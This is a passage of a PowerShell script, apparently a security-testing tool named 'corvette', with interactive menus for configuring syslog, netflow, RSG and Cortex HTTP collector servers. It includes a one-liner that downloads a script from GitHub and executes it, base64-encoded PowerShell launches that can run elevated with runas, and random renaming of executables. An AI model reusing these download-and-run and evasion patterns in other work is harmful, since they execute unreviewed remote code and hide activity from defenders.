Add-Type -AssemblyName System.IO.Compression
Set-Variable -Scope script -Name PATTERN_IPV4_ADDR -Option Constant -Value "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"


function IsFile (
    [string]$path
) {
    return [IO.File]::Exists($path)
}

function IsDirectory (
    [string]$path
) {
    return ![string]::IsNullOrEmpty($path) -And (Test-Path $path) -And ((Get-Item $path) -is [IO.DirectoryInfo])
}

function BuildFullPath (
    [string]$parent,
    [string]$child
) {
    return [IO.Path]::GetFullPath((Join-Path $parent $child))
}

function ReadAllBytes (
    [IO.Stream] $reader
) {
    $mem = [IO.MemoryStream]::New()
    $buf = New-Object byte[] 4096
    $actual = 0
    do {
        $actual = $reader.Read($buf, 0, $buf.Length)
        If ($actual -gt 0) {
            $mem.Write($buf, 0, $actual)
        }
    } While ($actual -ne 0)

    $mem.Close()
    return $mem.ToArray()
}

function DownloadString (
    [string]$url
) {
    return [Net.WebClient]::New().DownloadString($url)
}

function DownloadBytes (
    [string]$url
) {
    $resp = [Net.HttpWebRequest]::Create($url).GetResponse().GetResponseStream()
    return ReadAllBytes($resp)
}

function DownloadFile (
    [string]$url,
    [string]$save_as
) {
    $cli = New-Object Net.WebClient
    $cli.Headers.Add("Cache-Control", "no-cache, no-store")

    if ([string]::IsNullOrEmpty($save_as) -Or (IsDirectory $save_as)) {
        $uri = New-Object System.Uri($url)
        if (!$uri.AbsolutePath.EndsWith("/")) {
            $filename = Split-Path $uri.AbsolutePath -Leaf
        } else {
            $filename = "temp.dat"
        }
        if ((IsDirectory $save_as)) {
            $save_as = [IO.Path]::GetFullPath((Join-Path $save_as $filename))
        } else {
            $save_as = $filename
        }
    }
    $cli.DownloadFile($url, $save_as)
    return $save_as
}

function DownloadAndExtractArchive (
    [string]$url,
    [string]$directory
) {
    $file = DownloadFile $url ([IO.Path]::GetTempPath())
    Expand-Archive -Force $file $directory
    Remove-Item $file
}

function ExtractBytesFromZipFileInUrl (
    [string]$url,
    [string]$file_path
) {
    $z_data = DownloadBytes $url
    $zip = New-Object IO.Compression.ZipArchive([IO.MemoryStream]::New($z_data))
    
    $z_entry = $zip.Entries | Where-Object { $_.FullName -eq $file_path }
    if ($null -eq $z_entry) {
        throw "$file_path is not found in $url"
    }
    return ReadAllBytes($z_entry.Open())
}

function CompressToGzip (
    [byte[]]$data
) {
    $gzs = [IO.MemoryStream]::New()
    $gz = [IO.Compression.GZipStream]::New($gzs, [IO.Compression.CompressionMode]::Compress)
    $gz.Write($data, 0, $data.Length)
    $gz.Close()
    return $gzs.ToArray()
}

function ReadInput (
    [string]$message,
    [string]$default,
    [string[]]$and_patterns,
    [string]$retry_message
) {
    if (![string]::IsNullOrEmpty($default)) {
        $message += " (default: $default)"
    }
    do {
        $input = (Read-Host $message).Trim()
        if ([string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($default)) {
            return $default
        }
        $match = $true
        if (![string]::IsNullOrEmpty($and_patterns)) {
            foreach ($pattern in $and_patterns) {
                if ($input -notmatch $pattern) {
                    $match = $false
                    break
                }
            }
        }
        if ($match) {
            return $input
        }
        if (![string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($retry_message)) {
            Write-Host $retry_message
        }
    } while ($true)
}

function ReadPassword (
    [string]$message,
    [string]$default,
    [string]$pattern,
    [string]$retry_message
) {
    if (![string]::IsNullOrEmpty($default)) {
        $message += " (default: $default)"
    }
    do {
        $input = (Read-Host $message -AsSecureString)
        $input = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
           [Runtime.InteropServices.Marshal]::SecureStringToBSTR(
               $input
           )
        )
        $input = $input.Trim()

        if ([string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($default)) {
            return $default
        }
        if ([string]::IsNullOrEmpty($pattern) -Or ($input -match $pattern)) {
            return $input
        }
        if (![string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($retry_message)) {
            Write-Host $retry_message
        }
    } while ($true)
}

function ReadInputSize (
    [string]$message,
    [string]$default,
    [string]$retry_message
) {
    $pattern = "^(?<num>\d+(?:\.\d+)?)\s*(?<unit>[KMGT]?B)?$"
    $size_unit = $null
    do {
        $size = ReadInput $message $default @($pattern) $retry_message
        if ($size -match $pattern) {
            if ($matches.unit -eq $null){
                return $size
            }
            $size_unit = @{
                ""=1
                "B"=1
                "KB"=[Math]::pow(2, 10)
                "MB"=[Math]::pow(2, 20)
                "GB"=[Math]::pow(2, 30)
                "TB"=[Math]::pow(2, 40)
            }[$matches.unit]
            if ($size_unit) {
                return ((ParseNumber $matches.num) * $size_unit)
            }
        }
        Write-Host $retry_message
    } while ($true)
}

function ReadInputByChooser (
    [string]$message,
    [string]$default,
    [string[]]$options,
    [string]$retry_message
) {
    if (!$options) {
        throw "options are empty."
    }
    $display_options = @($options | select -Unique)

    if (![string]::IsNullOrEmpty($default)) {
        $index = [array]::IndexOf($options, $default)
        if ($index -ge 0) {
            $display_options[$index] = $default + " (default)"
        }
    }
    Write-Host $message":"
    $display_options | % {
        $index = [array]::IndexOf($display_options, $_) + 1
        Write-Host (" " + ([string]$index).PadLeft(2) + ") " + $_)
    }
    do {
        $input = (Read-Host "Choose an option").Trim()
        if ([string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($default)) {
            return $default
        }
        $index = ParseNumber($input)
        if ($index -ne $null -And $index -gt 0 -And $index -le $options.Length) {
            return $options[$index - 1]
        }
        if (![string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($retry_message)) {
            Write-Host $retry_message
        }
    } while ($true)
}

function AskYesNo (
    [string]$message,
    [string]$default = ""
) {
    $default = $default.ToLower()
    if (![string]::IsNullOrEmpty($default)) {
        if ($default -eq "yes" -Or $default -eq "y") {
            $message += " [Y/n default=Yes]"
        } elseif ($default -eq "no" -Or $default -eq "n") {
            $message += " [Y/n default=No]"
        } else {
            $message += " [Y/n]"
        }
    } else {
        $message += " [Y/n]"
    }
    do {
        $answer = Read-Host $message
        if ([string]::IsNullOrEmpty($answer)) {
            $answer = $default
        }
        $answer = $answer.ToLower()
        if ($answer -eq "yes" -Or $answer -eq "y") {
            return $true
        } elseif ($answer -eq "no" -Or $answer -eq "n") {
            return $false
        }
    } while ($true)
    return $false
}

function Quote (
    $value
) {
    if ($value -is [array]) {
        $value = ,@($value | % { (Quote $_) })
    } else {
        $value = $value.Replace('"', '""')
        $value = "`"$value`""
    }
    return $value
}

function QuoteCmdParam (
    $value
) {
    if ($value -is [array]) {
        $value = ,@($value | % { (QuoteCmdParam $_) })
    } else {
        if ($value.Contains('|')) {
            $value = "'$value'"
        }
        if ($value.Contains('"')) {
            $value = $value.Replace('"', '""""""')
        }
        if ($value.Contains(" ")) {
            $value = "`"`"`"$value`"`"`""
        }
    }
    return $value
}

function HexDigestSha256 (
    [byte[]]$data
) {
    $sha256 = [BitConverter]::ToString(
        [Security.Cryptography.SHA256]::Create().ComputeHash($data)
    ) -replace "-"
    return $sha256.ToLower()
}

function EncodeUrlPath (
    [string]$path
) {
    #return [System.Web.HttpUtility]::UrlPathEncode($path)
    return [Uri]::EscapeUriString($path)
}

function ParseNumber (
    [string]$val
) {
    $num = 0
    if ([int]::TryParse($val, [ref]$num)) {
        return $num
    } else {
        return $null
    }
}

function SplitCommandLine (
    [string]$cmdline
) {
    Begin
    {
        $Kernel32Definition = @'
            [DllImport("kernel32")]
            public static extern IntPtr LocalFree(IntPtr hMem);
'@
        $Kernel32 = Add-Type -MemberDefinition $Kernel32Definition -Name 'Kernel32' -Namespace 'Win32' -PassThru

        $Shell32Definition = @'
            [DllImport("shell32.dll", SetLastError = true)]
            public static extern IntPtr CommandLineToArgvW(
                [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
                out int pNumArgs);
'@
        $Shell32 = Add-Type -MemberDefinition $Shell32Definition -Name 'Shell32' -Namespace 'Win32' -PassThru
    }

    Process
    {
        $nargs = 0
        $argsptr = $Shell32::CommandLineToArgvW($cmdline, [ref]$nargs)

        try {
            $pargs = @()
            if ($nargs -ge 1) {
                0..($nargs - 1) | ForEach-Object {
                    $pargs += [Runtime.InteropServices.Marshal]::PtrToStringUni(
                        [Runtime.InteropServices.Marshal]::ReadIntPtr($argsptr, $_ * [IntPtr]::Size)
                    )
                }
            }
        } finally {
            $Kernel32::LocalFree($argsptr) | Out-Null
        }
        $args = @()
        foreach ($parg in $pargs) {
            $args += $parg
        }
        return $args
    }
}

function ChangeExecutableName (
    [hashtable]$exec_random,
    [string]$key,
    [string]$path
) {
    function GenerateRandomName([string]$path) {
        $dir = [IO.Path]::GetDirectoryName($path)
        $name = [IO.Path]::GetFileNameWithoutExtension($path)
        $name = (-Join (Get-Random -Count $name.length -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z))
        $fname = $name + [IO.Path]::GetExtension($path)
        if ([string]::IsNullOrEmpty($dir)) {
            return $fname
        } else {
            return (Join-Path $dir $fname)
        }
    }

    $xconf = $exec_random[$key]
    if ($xconf -eq $null) {
        return $null
    }
    switch ($xconf.mode) {
        "everytime" {
            return GenerateRandomName($path)
        }
        "process" {
            if ([string]::IsNullOrEmpty($xconf.rndname)) {
                $xconf.rndname = GenerateRandomName($path)
            }
            return $xconf.rndname
        }
        default {
            return $null
        }
    }
}

function StartEncodedScript (
    [string]$script,
    [bool]$run_as = $false,
    [bool]$wait = $false,
    [bool]$no_exit = $false
) {
    $arg_list = @(
        "-e",
        $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script)))
    )
    if ($no_exit) {
        $arg_list += "-NoExit"
    }
    $params = @{
        FilePath = "powershell.exe"
        ArgumentList = $arg_list
    }
    if ($wait) {
        $params["Wait"] = $null
    }
    if ($run_as) {
        $params["verb"] = "runas"
    }
    Start-Process @params
}

function StartProcess (
    [string]$cmd_path,
    [array]$cmd_args,
    [string]$home_dir = "",
    [string]$epilogue_script = ""
) {
    $script = @'
$cargs = ConvertFrom-Json $([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("@@@cmd_args@@@")))
$home_dir = "@@@home_dir@@@"
if ([string]::IsNullOrEmpty($dir)) {
    [string]$home_dir = Get-Location
}
if ($cargs) {
    Start-Process -FilePath "@@@cmd_path@@@" -ArgumentList $cargs -Wait -NoNewWindow -WorkingDirectory $home_dir
} else {
    Start-Process -FilePath "@@@cmd_path@@@" -Wait -NoNewWindow -WorkingDirectory $home_dir
}
Write-Host 'Done.'
Write-Host -NoNewLine 'Press any keys to continue...'
$null = [System.Console]::ReadKey()
& ([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("@@@epilogue_script@@@"))))
'@
    if (!$cmd_args) {
        $cmd_args = @()
    }
    if ($epilogue_script) {
        $epilogue_script = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($epilogue_script))
    }
    $cmd_name = Split-Path -Path $cmd_path -Leaf
    if ($cmd_name -ieq "cmd.exe" -Or $cmd_name -ieq "powershell.exe") {
        $cargs = QuoteCmdParam $cmd_args
    } else {
        $cargs = Quote $cmd_args
    }
    $cargs = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($(ConvertTo-Json $cargs -Compress)))
    $script = $script.Replace("@@@cmd_path@@@", $cmd_path)
    $script = $script.Replace("@@@cmd_args@@@", $cargs)
    $script = $script.Replace("@@@home_dir@@@", $home_dir)
    $script = $script.Replace("@@@epilogue_script@@@", $epilogue_script)
    
    StartEncodedScript $script
}

function GetEncodedCorvetteDynamicLoaderScript () {
    $script = "& ([ScriptBlock]::Create([Net.WebClient]::New().DownloadString('https://github.com/spearmin10/corvette/blob/main/corvette.ps1?raw=true')))"
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
}

function CleanupHome (
    [string]$home_dir
) {
    Get-ChildItem -Path $home_dir -Exclude @("corvette.json", "corvette.sha256") | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

class PropsSyslog {
    [string]$host
    [string]$port
    [string]$protocol

    PropsSyslog() {
        $this.Init($null)
    }

    PropsSyslog([PSCustomObject]$props) {
        $this.Init($props)
    }

    hidden [void]Init([PSCustomObject]$props) {
        if ($null -ne $props) {
            $this.host = $props.host
            $this.port = $props.port
            $this.protocol = $props.protocol
        }
        if ([string]::IsNullOrEmpty($this.port)) {
            $this.port = "514"
        }
        if ([string]::IsNullOrEmpty($this.protocol)) {
            $this.protocol = "UDP"
        }
    }

    [boolean]Equals([object]$obj) {
        return (
            $obj.host -eq $this.host -And
            $obj.port -eq $this.port -And
            $obj.protocol -eq $this.protocol
        )
    }

    [hashtable]Export() {
        return @{
            "host" = $this.host
            "port" = $this.port
            "protocol" = $this.protocol
        }
    }
}

class PropsNetflow {
    [string]$host
    [string]$port

    PropsNetflow() {
        $this.Init($null)
    }

    PropsNetflow([PSCustomObject]$props) {
        $this.Init($props)
    }

    hidden [void]Init([PSCustomObject]$props) {
        if ($null -ne $props) {
            $this.host = $props.host
            $this.port = $props.port
        }
        if ([string]::IsNullOrEmpty($this.port)) {
            $this.port = "2055"
        }
    }

    [boolean]Equals([object]$obj) {
        return (
            $obj.host -eq $this.host -And
            $obj.port -eq $this.port
        )
    }

    [hashtable]Export() {
        return @{
            "host" = $this.host
            "port" = $this.port
        }
    }
}

class PropsRsgSvr {
    [string]$host
    [string]$port

    PropsRsgSvr() {
        $this.Init($null)
    }

    PropsRsgSvr([PSCustomObject]$props) {
        $this.Init($props)
    }

    hidden [void]Init([PSCustomObject]$props) {
        if ($null -ne $props) {
            $this.host = $props.host
            $this.port = $props.port
        }
        if ([string]::IsNullOrEmpty($this.port)) {
            $this.port = "65534"
        }
    }

    [boolean]Equals([object]$obj) {
        return (
            $obj.host -eq $this.host -And
            $obj.port -eq $this.port
        )
    }

    [hashtable]Export() {
        return @{
            "host" = $this.host
            "port" = $this.port
        }
    }
}

class PropsCortexHttpCollector {
    [string]$api_url
    [string]$api_key_raw
    [string]$api_key_cef
    [boolean]$compression

    PropsCortexHttpCollector() {
        $this.Init($null)
    }

    PropsCortexHttpCollector([PSCustomObject]$props) {
        $this.Init($props)
    }

    hidden [void]Init([PSCustomObject]$props) {
        if ($null -ne $props) {
            $this.api_url = $props.api_url
            $this.api_key_raw = $props.api_key_raw
            $this.api_key_cef = $props.api_key_cef
            $this.compression = $props.compression
        }
        if ([string]::IsNullOrEmpty($this.compression)) {
            $this.compression = $true
        }
    }

    [boolean]Equals([object]$obj) {
        return (
            $obj.api_url -eq $this.api_url -And
            $obj.api_key_raw -eq $this.api_key_raw -And
            $obj.api_key_cef -eq $this.api_key_cef -And
            $obj.compression -eq $this.compression
        )
    }

    [object]Import([PSCustomObject]$props) {
        $this.Init(@{
            "api_url" = $props.api_url
            "compression" = $props.compression
            "api_key_raw" = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR(
                [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
                    $(ConvertTo-SecureString -String ([string]$props.api_key_raw))
                )
            )
            "api_key_cef" = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR(
                [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
                    $(ConvertTo-SecureString -String ([string]$props.api_key_cef))
                )
            )
        })
        return $this
    }

    [hashtable]Export() {
        return @{
            "api_url" = $this.api_url
            "api_key_raw" = $(ConvertTo-SecureString -string ([string]$this.api_key_raw) -AsPlainText -Force | ConvertFrom-SecureString)
            "api_key_cef" = $(ConvertTo-SecureString -string ([string]$this.api_key_cef) -AsPlainText -Force | ConvertFrom-SecureString)
            "compression" = $this.compression
        }
    }
}

class Properties {
    [string]$my_script
    [string]$home_dir
    [Management.Automation.InvocationInfo]$invocation_info

    [PropsSyslog[]]$syslog
    [PropsNetflow[]]$netflow
    [PropsRsgSvr[]]$rsgsvr
    [PropsCortexHttpCollector[]]$cortex_hec
    [hashtable]$exec_random

    Properties([Management.Automation.InvocationInfo]$info) {
        $this.invocation_info = $info
        $this.home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"

        if ([string]::IsNullOrEmpty($info.MyCommand.Path)) {
            $this.my_script = $info.MyCommand
        } else {
            $this.my_script = [IO.File]::ReadAllText($info.MyCommand.Path)
        }
        $this.Load()
    }

    hidden [void]Initialize() {
        New-Item -ItemType Directory -Force -Path $this.home_dir

        # Remove outdated files in the home directory when a newer version is run.
        $old_sha256 = ""
        $new_sha256 = HexDigestSha256([Text.Encoding]::UTF8.GetBytes($this.my_script))
        $path = BuildFullPath $this.home_dir ".\corvette.sha256"
        if (IsFile $path) {
            $old_sha256 = [IO.File]::ReadAllText($path).Trim()
        }
        if ($new_sha256 -ne $old_sha256) {
            [IO.File]::WriteAllText($path, $new_sha256)
            CleanupHome $this.home_dir
        }
    }

    hidden [void]Load() {
        $conf_file = BuildFullPath $this.home_dir ".\corvette.json"
        if (IsFile $conf_file) {
            $settings = Get-Content $conf_file -Encoding utf8 -Raw | ConvertFrom-Json
        } else {
            $settings = @{}
        }
        $this.syslog = @()
        if ($settings.syslog -is [array]) {
            foreach ($props in $settings.syslog) {
                $this.syslog += [PropsSyslog]::New($props)
            }
        }
        $this.netflow = @()
        if ($settings.netflow -is [array]) {
            foreach ($props in $settings.netflow) {
                $this.netflow += [PropsNetflow]::New($props)
            }
        }
        $this.rsgsvr = @()
        if ($settings.rsgsvr -is [array]) {
            foreach ($props in $settings.rsgsvr) {
                $this.rsgsvr += [PropsRsgSvr]::New($props)
            }
        }

        $this.cortex_hec = @()
        if ($settings.cortex_hec -is [array]) {
            foreach ($props in $settings.cortex_hec) {
                try {
                    $this.cortex_hec += [PropsCortexHttpCollector]::New().Import($props)
                } catch {
                }
            }
        }

        $this.exec_random = @{}
        if ($settings.exec_random -ne $null) {
            foreach ($name in $settings.exec_random.psobject.properties.name) {
                $this.exec_random[$name] = @{
                    "mode"=$settings.exec_random.$name.mode
                }
            }
        }
    }

    [void]Save() {
        $conf_file = BuildFullPath $this.home_dir ".\corvette.json"
        $local:exec_random = @{}
        if ($this.exec_random -ne $null) {
            foreach ($name in $this.exec_random.keys) {
                $local:exec_random[$name] = @{
                    "mode"=$this.exec_random.$name.mode
                }
            }
        }

        $local:syslog = @()
        if ($this.syslog -is [array]) {
            foreach ($props in $this.syslog) {
                $local:syslog += $props.Export()
            }
        }

        $local:netflow = @()
        if ($this.netflow -is [array]) {
            foreach ($props in $this.netflow) {
                $local:netflow += $props.Export()
            }
        }

        $local:rsgsvr = @()
        if ($this.rsgsvr -is [array]) {
            foreach ($props in $this.rsgsvr) {
                $local:rsgsvr += $props.Export()
            }
        }

        $local:cortex_hec = @()
        if ($this.cortex_hec -is [array]) {
            foreach ($props in $this.cortex_hec) {
                $local:cortex_hec += $props.Export()
            }
        }

        $settings = @{
            "syslog" = $local:syslog
            "netflow" = $local:netflow
            "rsgsvr" = $local:rsgsvr
            "cortex_hec" = $local:cortex_hec
            "exec_random" = $local:exec_random
        }
        $settings | ConvertTo-Json | Set-Content -Encoding utf8 -Path $conf_file
    }

    [string]MakeSureGzScriptFileExists() {
        $script_gz = CompressToGzip $([Text.Encoding]::UTF8.GetBytes($this.my_script))
        $path = BuildFullPath $this.home_dir ".\corvette.ps1.gz"
        if (
            !(IsFile $path) -Or
            ![Linq.Enumerable]::SequenceEqual($script_gz, [IO.File]::ReadAllBytes($path))
        ) {
            [IO.File]::WriteAllBytes($path, $script_gz)
        }
        return $path
    }

    [PropsSyslog]SelectDefaultSyslogServer() {
        $items = $this.syslog
        if ($items.Length -ne 0) {
            while ($true) {
                Write-Host "Select a default syslog server"
                Write-Host "************************************"
                for ($i=0; $i -lt $items.Length; $i++) {
                    $props = $items[$i]
                    Write-Host " $($i + 1)) $($props.host):$($props.port) ($($props.protocol))"
                }
                Write-Host " q) Exit"
                do {
                    $cmd = Read-Host "Please choose a menu item"
                    if ($cmd -eq "q") {
                        return $null
                    }
                    $num = ParseNumber ($cmd)
                    if ($num -gt 0 -And $num -le $items.Length) {
                        return $items[$num - 1]
                    }
                } while($true)
            }
        }
        return $null
    }

    [PropsNetflow]SelectDefaultNetflowServer() {
        $items = $this.netflow
        if ($items.Length -ne 0) {
            while ($true) {
                Write-Host "Select a default netflow server"
                Write-Host "************************************"
                for ($i=0; $i -lt $items.Length; $i++) {
                    $props = $items[$i]
                    Write-Host " $($i + 1)) $($props.host):$($props.port)"
                }
                Write-Host " q) Exit"
                do {
                    $cmd = Read-Host "Please choose a menu item"
                    if ($cmd -eq "q") {
                        return $null
                    }
                    $num = ParseNumber ($cmd)
                    if ($num -gt 0 -And $num -le $items.Length) {
                        return $items[$num - 1]
                    }
                } while($true)
            }
        }
        return $null
    }

    [PropsRsgSvr]SelectDefaultRsgServer() {
        $items = $this.rsgsvr
        if ($items.Length -ne 0) {
            while ($true) {
                Write-Host "Select a default RSG server"
                Write-Host "************************************"
                for ($i=0; $i -lt $items.Length; $i++) {
                    $props = $items[$i]
                    Write-Host " $($i + 1)) $($props.host):$($props.port)"
                }
                Write-Host " q) Exit"
                do {
                    $cmd = Read-Host "Please choose a menu item"
                    if ($cmd -eq "q") {
                        return $null
                    }
                    $num = ParseNumber ($cmd)
                    if ($num -gt 0 -And $num -le $items.Length) {
                        return $items[$num - 1]
                    }
                } while($true)
            }
        }
        return $null
    }

    [PropsCortexHttpCollector]SelectDefaultCortexHttpCollector() {
        $items = $this.cortex_hec
        if ($items.Length -ne 0) {
            while ($true) {
                Write-Host "Select a default Cortex HTTP Collector"
                Write-Host "************************************"
                for ($i=0; $i -lt $items.Length; $i++) {
                    $props = $items[$i]
                    $raw_enabled = "disabled"
                    if (![string]::IsNullOrEmpty($props.api_key_raw)) {
                        $raw_enabled = "enabled"
                    }
                    $cef_enabled = "disabled"
                    if (![string]::IsNullOrEmpty($props.api_key_cef)) {
                        $cef_enabled = "enabled"
                    }
                    Write-Host " $($i + 1)) $($props.api_url) (raw:$raw_enabled cef:$cef_enabled compression:$($props.compression))"
                }
                Write-Host " q) Exit"
                do {
                    $cmd = Read-Host "Please choose a menu item"
                    if ($cmd -eq "q") {
                        return $null
                    }
                    $num = ParseNumber ($cmd)
                    if ($num -gt 0 -And $num -le $items.Length) {
                        return $items[$num - 1]
                    }
                } while($true)
            }
        }
        return $null
    }
}

class CommandBase {
    [Properties]$props

    CommandBase([Properties]$props) {
        $this.props = $props
    }
}

class ConfigureSettings : CommandBase {

    ConfigureSettings([Properties]$props) : base($props) {
    }

    hidden [void]ConfigureDefaultSyslogServer() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) List syslog servers"
            Write-Host " 2) Add a syslog server"
            Write-Host " 3) Delete a syslog server"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "1" {
                            Write-Host ""
                            if ($this.props.syslog.Length -eq 0) {
                                Write-Host "* No Default Syslog Servers"
                            } else {
                                Write-Host "* Default Syslog Servers"
                                foreach ($props in $this.props.syslog) {
                                    Write-Host "  - $($props.host):$($props.port) ($($props.protocol))"
                                }
                            }
                            Write-Host ""
                        }
                        "2" {
                            $this.AddDefaultSyslogServer()
                        }
                        "3" {
                            $this.DeleteDefaultSyslogServer()
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [void]AddDefaultSyslogServer() {
        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        
        $props = [PropsSyslog]::New()
        $props.host = `
            ReadInput "Syslog Host" `
                      $props.host `
                      @("^.+$")
        $props.port = `
            ReadInput "Syslog Port" `
                      $props.port `
                      @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                      "Please retype a valid port number"
        $props.protocol = `
            ReadInput "Syslog Protocol" `
                      $props.protocol `
                      @("^UDP|TCP|udp|tcp$") `
                      "Please retype a valid protocol"

        if ($props -in $this.props.syslog) {
            Write-Host "The syslog parameters already exist."
            return
        }
        if (AskYesNo "Do you want to add?") {
            $this.props.syslog += $props
            $this.props.Save()
        }
    }

    hidden [void]DeleteDefaultSyslogServer() {
        if ($this.props.syslog.Length -eq 0) {
            Write-Host "* No Default Syslog Servers"
            return
        }
        [System.Collections.ArrayList]$items = $this.props.syslog

        while ($true) {
            Write-Host ""
            Write-Host "Delete a default syslog server"
            Write-Host "************************************"
            for ($i=0; $i -lt $items.Count; $i++) {
                $props = $items[$i]
                Write-Host " $($i + 1)) $($props.host):$($props.port) ($($props.protocol))"
            }
            Write-Host " q) Exit"
            do {
                $cmd = Read-Host "Please choose a menu item"
                if ($cmd -eq "q") {
                    if ((@(Compare-Object $items $this.props.syslog -SyncWindow 0).Length -ne 0) -And
                        $(AskYesNo "Do you want to save changes?")) {
                        $this.props.syslog = $items
                        $this.props.Save()
                    }
                    return
                }
                $num = ParseNumber ($cmd)
                if ($num -gt 0 -And $num -le $items.Count) {
                    $items.RemoveAt($num - 1)
                    break
                }
            } while($true)
        }
    }

    hidden [void]ConfigureDefaultNetflowServer() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) List netflow servers"
            Write-Host " 2) Add a netflow server"
            Write-Host " 3) Delete a netflow server"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "1" {
                            Write-Host ""
                            if ($this.props.netflow.Length -eq 0) {
                                Write-Host "* No Default Netflow Servers"
                            } else {
                                Write-Host "* Default Netflow Servers"
                                foreach ($props in $this.props.netflow) {
                                    Write-Host "  - $($props.host):$($props.port)"
                                }
                            }
                            Write-Host ""
                        }
                        "2" {
                            $this.AddDefaultNetflowServer()
                        }
                        "3" {
                            $this.DeleteDefaultNetflowServer()
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [void]AddDefaultNetflowServer() {
        Write-Host ""
        Write-Host "### Enter the netflow configuration"

        $props = [PropsNetflow]::New()
        $props.host = ReadInput `
            "Netflow Host" `
            $props.host `
            @("^.+$")
        $props.port = `
            ReadInput "Netflow Port" `
            $props.port `
            @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
            "Please retype a valid port number"

        if ($props -in $this.props.syslog) {
            Write-Host "The netflow parameters already exist."
            return
        }
        if (AskYesNo "Do you want to add?") {
            $this.props.netflow += $props
            $this.props.Save()
        }
    }

    hidden [void]DeleteDefaultNetflowServer() {
        if ($this.props.netflow.Length -eq 0) {
            Write-Host "* No Default Netflow Servers"
            return
        }
        [System.Collections.ArrayList]$items = $this.props.netflow

        while ($true) {
            Write-Host ""
            Write-Host "Delete a default netflow server"
            Write-Host "************************************"
            for ($i=0; $i -lt $items.Count; $i++) {
                $props = $items[$i]
                Write-Host " $($i + 1)) $($props.host):$($props.port)"
            }
            Write-Host " q) Exit"
            do {
                $cmd = Read-Host "Please choose a menu item"
                if ($cmd -eq "q") {
                    if ((@(Compare-Object $items $this.props.netflow -SyncWindow 0).Length -ne 0) -And
                        $(AskYesNo "Do you want to save changes?")) {
                        $this.props.netflow = $items
                        $this.props.Save()
                    }
                    return
                }
                $num = ParseNumber ($cmd)
                if ($num -gt 0 -And $num -le $items.Count) {
                    $items.RemoveAt($num - 1)
                    break
                }
            } while($true)
        }
    }


    hidden [void]ConfigureDefaultRsgServer() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) List RSG servers"
            Write-Host " 2) Add a RSG server"
            Write-Host " 3) Delete a RSG server"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "1" {
                            Write-Host ""
                            if ($this.props.rsgsvr.Length -eq 0) {
                                Write-Host "* No Default RSG Servers"
                            } else {
                                Write-Host "* Default RSG Servers"
                                foreach ($props in $this.props.rsgsvr) {
                                    Write-Host "  - $($props.host):$($props.port)"
                                }
                            }
                            Write-Host ""
                        }
                        "2" {
                            $this.AddDefaultRsgServer()
                        }
                        "3" {
                            $this.DeleteDefaultRsgServer()
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [void]AddDefaultRsgServer() {
        Write-Host ""
        Write-Host "### Enter the RSG server configuration"

        $props = [PropsRsgSvr]::New()
        $props.host = ReadInput `
            "RSG Host" `
            $props.host `
            @("^.+$")
        $props.port = `
            ReadInput "RSG Port" `
            $props.port `
            @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
            "Please retype a valid port number"

        if ($props -in $this.props.syslog) {
            Write-Host "The RSG server parameters already exist."
            return
        }
        if (AskYesNo "Do you want to add?") {
            $this.props.rsgsvr += $props
            $this.props.Save()
        }
    }

    hidden [void]DeleteDefaultRsgServer() {
        if ($this.props.rsgsvr.Length -eq 0) {
            Write-Host "* No Default RSG Servers"
            return
        }
        [System.Collections.ArrayList]$items = $this.props.rsgsvr

        while ($true) {
            Write-Host ""
            Write-Host "Delete a default RSG server"
            Write-Host "************************************"
            for ($i=0; $i -lt $items.Count; $i++) {
                $props = $items[$i]
                Write-Host " $($i + 1)) $($props.host):$($props.port)"
            }
            Write-Host " q) Exit"
            do {
                $cmd = Read-Host "Please choose a menu item"
                if ($cmd -eq "q") {
